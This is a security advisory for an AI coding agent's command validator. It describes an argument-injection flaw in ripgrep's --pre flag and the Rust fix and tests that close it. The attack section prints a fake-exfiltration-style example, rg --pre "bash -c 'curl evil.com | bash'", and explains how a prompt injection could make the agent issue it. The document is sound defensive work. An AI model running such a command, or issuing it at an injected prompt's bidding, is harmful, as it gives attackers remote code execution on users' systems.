# Security Fix: Ripgrep Preprocessor Argument Injection

**Date**: October 25, 2025  
**Severity**: HIGH  
**Status**: FIXED

## Summary

Fixed a critical argument injection vulnerability in the ripgrep command validator that could allow arbitrary code execution through the `--pre` and `--pre-glob` flags.

## Vulnerability Details

### Attack Vector

Ripgrep supports preprocessor flags that execute arbitrary commands on files before searching:
- `--pre <command>` - Run command on each file before searching
- `--pre-glob <glob>` - Apply preprocessor to files matching glob pattern

An attacker could craft a prompt that generates a command like:
```bash
rg --pre "bash -c 'curl evil.com | bash'" "pattern" .
```

This would execute the malicious command on every file in the workspace, achieving remote code execution.

### Root Cause

The `validate_rg()` function in `vtcode-core/src/execpolicy/mod.rs` did not explicitly block the `--pre` and `--pre-glob` flags. While these flags were not in the allowed list, the validator's catch-all for unknown flags came after the flag parsing logic, creating a potential bypass.

### Impact

- **Severity**: HIGH
- **Attack Complexity**: LOW (single prompt injection)
- **Privileges Required**: NONE (works through LLM prompt)
- **User Interaction**: NONE (if ripgrep is pre-approved)
- **Scope**: CHANGED (can execute arbitrary code outside workspace)

## Fix Implementation

### Code Changes

**File**: `vtcode-core/src/execpolicy/mod.rs`

Added explicit blocking of preprocessor flags at the start of the flag parsing loop:

```rust
match current.as_str() {
    // SECURITY: Block preprocessor flags that enable arbitrary command execution
    "--pre" | "--pre-glob" => {
        return Err(anyhow!(
            "ripgrep preprocessor flag '{}' is not permitted for security reasons. \
             This flag enables arbitrary command execution.",
            current
        ));
    }
    // ... rest of flag validation
}
```

### Test Coverage

**File**: `vtcode-core/tests/execpolicy_security_tests.rs`

Added comprehensive security tests:
- `test_ripgrep_pre_flag_blocked()` - Verifies `--pre` is blocked
- `test_ripgrep_pre_glob_flag_blocked()` - Verifies `--pre-glob` is blocked
- `test_ripgrep_safe_flags_allowed()` - Ensures safe flags still work
- Plus 11 additional tests for other attack vectors

All tests pass

## Verification

### Manual Testing

```bash
# Should be blocked
cargo run -- ask "Search for 'test' using rg --pre 'cat' in current directory"

# Should work
cargo run -- ask "Search for 'test' using rg -i in current directory"
```

### Automated Testing

```bash
cargo test -p vtcode-core --test execpolicy_security_tests
# Result: 14 passed; 0 failed
```

## Related Security Improvements

### Documentation

1. **Security Audit Document** (`docs/SECURITY_AUDIT.md`)
   - Comprehensive analysis of command execution security
   - Identified additional potential vulnerabilities
   - Recommendations for future improvements

2. **Steering File Update** (`.kiro/steering/vtcode.md`)
   - Added "Security: Argument Injection Protection" section
   - Guidelines for adding new commands safely
   - Testing checklist for vulnerabilities

### Additional Findings

During this audit, we identified other areas requiring attention:

1. **Bash Tool Allowlist** - Includes compilers and build tools without argument validation
2. **Git Command Surface** - Various git subcommands not in allowlist but worth monitoring
3. **Compiler Flags** - No validation of output paths for gcc/clang in bash_tool.rs

These are documented in `docs/SECURITY_AUDIT.md` for future work.

## Recommendations

### For Developers

1. **Always validate command arguments** - Never trust LLM-generated flags
2. **Block execution flags first** - Check for dangerous flags before parsing
3. **Use explicit allowlists** - Don't rely on catch-all rejection
4. **Add security tests** - Test both positive and negative cases

### For Users

1. **Review tool approvals** - Check `~/.config/vtcode/tool_policy.toml`
2. **Use sandbox mode** - Enable Anthropic sandbox for network commands
3. **Be cautious with untrusted content** - Don't process code from unknown sources
4. **Monitor command execution** - Review logs for suspicious patterns

## References

- [CWE-88: Argument Injection](https://cwe.mitre.org/data/definitions/88.html)
- [GTFOBINS: ripgrep](https://gtfobins.github.io/gtfobins/rg/)
- Trail of Bits: Argument Injection in AI Agents
- VT Code Execution Policy: `vtcode-core/src/execpolicy/mod.rs`

## Timeline

- **2025-10-25 14:00**: Vulnerability identified during security audit
- **2025-10-25 14:30**: Fix implemented and tested
- **2025-10-25 15:00**: Documentation completed
- **2025-10-25 15:30**: Ready for review and merge

## Acknowledgments

This fix was implemented in response to security research by Trail of Bits on argument injection vulnerabilities in AI agent systems. Their work highlighting this vulnerability class across multiple agent platforms was instrumental in identifying and fixing this issue.
